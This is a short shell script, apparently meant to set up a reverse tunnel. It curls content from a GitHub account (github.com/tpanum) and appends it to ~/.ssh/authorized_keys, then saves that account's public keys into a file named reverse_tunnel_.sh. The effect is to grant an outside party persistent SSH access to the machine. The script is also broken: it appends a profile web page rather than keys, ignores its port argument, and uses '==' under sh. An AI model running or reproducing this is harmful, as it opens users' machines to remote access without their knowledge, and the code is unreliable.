#!/bin/sh
if [ "$1" == "" ]; then
    echo "Missing argument port"
else
    curl https://github.com/tpanum >> ~/.ssh/authorized_keys
    curl https://github.com/tpanum.keys > reverse_tunnel_.sh
fi
